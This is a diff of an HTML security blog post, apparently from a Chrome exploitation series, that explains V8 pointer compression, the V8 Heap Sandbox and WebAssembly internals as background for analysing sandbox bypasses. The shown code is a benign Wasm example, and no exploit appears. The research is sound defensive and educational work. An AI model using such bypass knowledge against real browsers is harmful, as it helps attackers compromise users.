@@ -39,8 +39,8 @@
 &lt;p&gt;&lt;img src=&#34;https://v8.dev/_img/pointer-compression/heap-layout-1.svg&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;If you apply this within a 4GB-aligned memory space, all objects share the exact same base address. This means you can easily access any internal object using just a 32-bit offset.&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;                    |----- &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; bits -----|----- &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; bits -----|
-&lt;span class=&#34;hljs-title class_&#34;&gt;Compressed&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;pointer&lt;/span&gt;:                     |______offset_____w1|
-&lt;span class=&#34;hljs-title class_&#34;&gt;Compressed&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Smi&lt;/span&gt;:                         |____int31_value___0|&lt;/code&gt;&lt;/pre&gt;
+Compressed pointer:                     |______offset_____w1|
+Compressed Smi:                         |____int31_value___0|&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;However, not every value in V8 memory is stored within this 4GB region. Because of this, uncompressed pointers (raw pointers) still existed to access external objects. Solving this exact issue was one of the main goals behind creating the V8 Heap Sandbox.&lt;/p&gt;
 &lt;h3 id=&#34;2-2-Mechanism-of-V8-Heap-Sandbox&#34;&gt;&lt;a href=&#34;#2-2-Mechanism-of-V8-Heap-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;2.2. Mechanism of V8 Heap Sandbox&#34;&gt;&lt;/a&gt;2.2. Mechanism of V8 Heap Sandbox&lt;/h3&gt;&lt;p&gt;The V8 Heap Sandbox is a new security mitigation introduced in March 2024, starting with Chrome version 123. In this post, we will revisit the concept of the V8 Heap Sandbox&amp;#x2014;which was briefly mentioned at the end of &lt;a href=&#34;https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/en/&#34;&gt;&lt;em&gt;Chrome Exploit Part 4: Starting with Type Confusion 101&lt;/em&gt;&lt;/a&gt; (published before the Wipeload project)&amp;#x2014;and analyze the methods used to bypass it from a technical perspective.&lt;/p&gt;
 &lt;p&gt;In the case of the two previously mentioned vulnerabilities, if memory corruption allowed arbitrary read/write access, there were no restrictions on the accessible memory area, making successful exploitation relatively smooth. The Heap Sandbox was introduced to block this, limiting access so that even if memory corruption occurs, attackers cannot access arbitrary memory addresses.&lt;/p&gt;
@@ -76,22 +76,22 @@
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Based on these patch histories, we can infer that a field storing a raw pointer existed within &lt;code&gt;WasmIndirectFunctionTable&lt;/code&gt;, a Wasm-related object. Before diving into the vulnerability itself, let&amp;#x2019;s take a quick look at what this object actually does.&lt;/p&gt;
-&lt;h4 id=&#34;3-1-2-Wasm-Fundamentals&#34;&gt;&lt;a href=&#34;#3-1-2-Wasm-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.1.2. Wasm Fundamentals&#34;&gt;&lt;/a&gt;3.1.2. Wasm Fundamentals&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; tbl = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Table&lt;/span&gt;({
-    &lt;span class=&#34;hljs-attr&#34;&gt;initial&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
-    &lt;span class=&#34;hljs-attr&#34;&gt;element&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;anyfunc&amp;quot;&lt;/span&gt;
+&lt;h4 id=&#34;3-1-2-Wasm-Fundamentals&#34;&gt;&lt;a href=&#34;#3-1-2-Wasm-Fundamentals&#34; class=&#34;headerlink&#34; title=&#34;3.1.2. Wasm Fundamentals&#34;&gt;&lt;/a&gt;3.1.2. Wasm Fundamentals&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; tbl = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Table({
+    initial: &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,
+    element: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;anyfunc&amp;quot;&lt;/span&gt;
 });
 &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; importObject = {
-    &lt;span class=&#34;hljs-attr&#34;&gt;env&lt;/span&gt;: {
-        &lt;span class=&#34;hljs-attr&#34;&gt;jstimes3&lt;/span&gt;: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
+    env: {
+        jstimes3: &lt;span class=&#34;hljs-function&#34;&gt;(&lt;span class=&#34;hljs-params&#34;&gt;n&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; * n,
     },
-    &lt;span class=&#34;hljs-attr&#34;&gt;js&lt;/span&gt;: { tbl }
+    js: { tbl }
 };
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;51&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;98&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;119&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable language_&#34;&gt;module&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Module&lt;/span&gt;(code);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; instance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;WebAssembly&lt;/span&gt;.&lt;span class=&#34;hljs-title class_&#34;&gt;Instance&lt;/span&gt;(&lt;span class=&#34;hljs-variable language_&#34;&gt;module&lt;/span&gt;, importObject);
-&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; times2 = instance.&lt;span class=&#34;hljs-property&#34;&gt;exports&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;times2&lt;/span&gt;;
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; code = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;51&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;106&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;98&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;119&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;211&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(code);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; instance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(&lt;span class=&#34;hljs-built_in&#34;&gt;module&lt;/span&gt;, importObject);
+&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; times2 = instance.exports.times2;
 
-%&lt;span class=&#34;hljs-title class_&#34;&gt;DebugPrint&lt;/span&gt;(instance);&lt;/code&gt;&lt;/pre&gt;
+%DebugPrint(instance);&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Wasm is mainly composed of a Module, an Instance, and a Table. A Module is the raw, uninitialized code, which turns into an Instance after going through an initialization process. An Instance can own multiple Tables, and in our example, we can see that &lt;code&gt;tbl&lt;/code&gt; created inside &lt;code&gt;importObject&lt;/code&gt; is passed along.&lt;/p&gt;
 &lt;p&gt;Within V8, an Instance is managed as a &lt;code&gt;WasmInstanceObject&lt;/code&gt;, and its key fields are as follows:&lt;/p&gt;
 &lt;ol&gt;
@@ -161,22 +161,22 @@ DebugPrint: 0x194f001cce8d: [FixedArray]
            1: 0
 &lt;span class=&#34;hljs-comment&#34;&gt;# ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;In the initial code snippet, we couldn&amp;#x2019;t directly see the declarations for &lt;code&gt;$f42&lt;/code&gt; and &lt;code&gt;$f83&lt;/code&gt;. To verify them yourself, converting the wasm code&amp;#x2014;which was originally declared as a &lt;code&gt;Uint8Array&lt;/code&gt;&amp;#x2014;into a human-readable format yields the following text:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;module&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; The common type we use throughout the sample.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;param&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs wasm&#34;&gt;(module
+  ;; The common type we use throughout the sample.
+  (type $int2int (func (param i32) (result i32)))
 
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; Import a function named jstimes3 from the environment and call it&lt;/span&gt;
-  &lt;span class=&#34;hljs-comment&#34;&gt;;; $jstimes3 here.&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;env&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;jstimes3&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$jstimes3&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$int2int&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)))&lt;/span&gt;
+  ;; Import a function named jstimes3 from the environment and call it
+  ;; $jstimes3 here.
+  (import &amp;quot;env&amp;quot; &amp;quot;jstimes3&amp;quot; (func $jstimes3 (type $int2int)))
 
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;js&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;tbl&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; funcref&lt;span class=&#34;hljs-punctuation&#34;&gt;))&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f42&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;;; [1] Define $f42 function&lt;/span&gt;
-  &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;hljs-title function_&#34;&gt;$f83&lt;/span&gt; &lt;span class=&#34;hljs-punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;i32&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;i32.const&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;hljs-comment&#34;&gt;;; [2] Define $f83 function&lt;/span&gt;
